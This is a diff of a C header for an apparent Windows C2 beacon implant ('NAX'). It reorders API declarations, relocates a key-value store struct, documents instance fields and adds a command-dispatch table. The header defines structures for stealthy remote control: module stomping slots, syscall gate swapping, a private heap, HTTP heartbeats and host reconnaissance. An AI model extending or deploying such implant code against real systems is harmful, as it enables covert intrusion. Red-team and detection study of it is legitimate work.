@@ -115,6 +115,7 @@ typedef struct {
     D_API( NtOpenProcessToken );
     D_API( NtQueryInformationToken );
     D_API( NtQueryInformationProcess );
+    D_API( NtSetInformationProcess );
     D_API( NtClose );
     D_API( NtQuerySystemInformation );
     D_API( NtOpenProcess );
@@ -132,7 +133,6 @@ typedef struct {
     D_API( _vsnprintf );
     D_API( DbgPrint );
     D_API( NtQueryVirtualMemory );
-    D_API( NtSetInformationProcess );
 } NAX_NTDLL;
 
 /* ========= [ msvcrt.dll ] ========= */
@@ -165,6 +165,7 @@ typedef struct {
     D_API( MoveFileExA );
     D_API( CloseHandle );
     D_API( RemoveDirectoryA );
+    D_API( SetFileAttributesA );
     D_API( FindFirstFileA );
     D_API( FindNextFileA );
     D_API( FindClose );
@@ -200,7 +201,6 @@ typedef struct {
     D_API( GetACP );
     D_API( GetOEMCP );
     D_API( GetProcessMitigationPolicy );
-    D_API( SetFileAttributesA );
 } NAX_KERNEL32;
 
 /* ========= [ kernelbase.dll ] ========= */
@@ -416,14 +416,6 @@ typedef struct {
     BYTE   StompSlot;    /* sync=0xFF, async=0-3                               */
 } NAX_BOF_CTX;
 
-/* ========= [ BOF key-value store ] ========= */
-
-typedef struct _NAX_KV_ENTRY {
-    UINT32                Hash;
-    PVOID                 Ptr;
-    struct _NAX_KV_ENTRY* Next;
-} NAX_KV_ENTRY;
-
 /* ========= [ chunked download state ] ========= */
 
 typedef struct _NAX_DOWNLOAD {
@@ -455,6 +447,8 @@ typedef struct _NAX_MEMSAVE {
 #define NAX_JOB_ABANDONED 4
 
 typedef struct _NAX_INSTANCE NAX_INSTANCE, *PNAX_INSTANCE;
+
+typedef INT (*NAX_CMD_HANDLER)( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* result_status, PBYTE result_data, UINT32* result_data_len );
 
 typedef struct _NAX_JOB {
     PNAX_INSTANCE       Nax;
@@ -531,27 +525,35 @@ typedef struct {
     UINT32        Count;
 } NAX_GATE_SWAP_TABLE;
 
+/* ========= [ key-value store entry ] ========= */
+
+typedef struct _NAX_KV_ENTRY {
+    UINT32                  Hash;
+    PVOID                   Ptr;
+    struct _NAX_KV_ENTRY*   Next;
+} NAX_KV_ENTRY;
+
 /* ========= [ beacon instance ] ========= */
 
 #define NAX_HTTP_STALE_MS  60000u  /* close persistent handles when sleep > this */
 #define NAX_INSTANCE_MAGIC 0x4E615843u  /* "NaXC" */
 
 struct _NAX_INSTANCE {
-    UINT32       Magic;          /* NAX_INSTANCE_MAGIC — validates TEB pointer */
+    UINT32       Magic;          /* NAX_INSTANCE_MAGIC — validates instance pointer */
     CHAR         SessionId[17];  /* 16 hex chars + NUL                    */
-    NAX_CONFIG   Config;
-    HANDLE       Heap;
+    NAX_CONFIG   Config;         /* all runtime-configurable fields        */
+    HANDLE       Heap;           /* private beacon heap                    */
 
     /* persistent WinHTTP handles - reused across heartbeats              */
-    HINTERNET    hSession;
-    HINTERNET    hConnect;
+    HINTERNET    hSession;       /* WinHttpOpen (UA + proxy config)        */
+    HINTERNET    hConnect;       /* WinHttpConnect (host:port)             */
 
     /* system info - gathered once at boot, sent in REGISTER */
     BYTE         Elevated;       /* 1 if running elevated / admin          */
     UINT32       OsMajor;        /* Windows major version (PEB+0x118)      */
     UINT32       OsMinor;        /* Windows minor version (PEB+0x11C)      */
     UINT16       OsBuild;        /* Windows build number  (PEB+0x120)      */
-    UINT32       ParentPid;
+    UINT32       ParentPid;      /* parent process ID                      */
     UINT32       Acp;            /* ANSI code page                         */
     UINT32       OemCp;          /* OEM code page                          */
     CHAR         ImgPath[260];   /* full image path (UTF-8)                */
@@ -602,6 +604,9 @@ struct _NAX_INSTANCE {
     PRUNTIME_FUNCTION ResidentPdata;
     DWORD        ResidentPdataCount;
     BOOL         ResidentPdataInDll;
+
+    /* command dispatch table - populated once by NaxDispatchInit */
+    NAX_CMD_HANDLER CmdTable[ NAX_CMD_TABLE_SIZE ];
 };
 
 static inline NAX_JOB* NaxFindCurrentJob( PNAX_INSTANCE Nax ) {
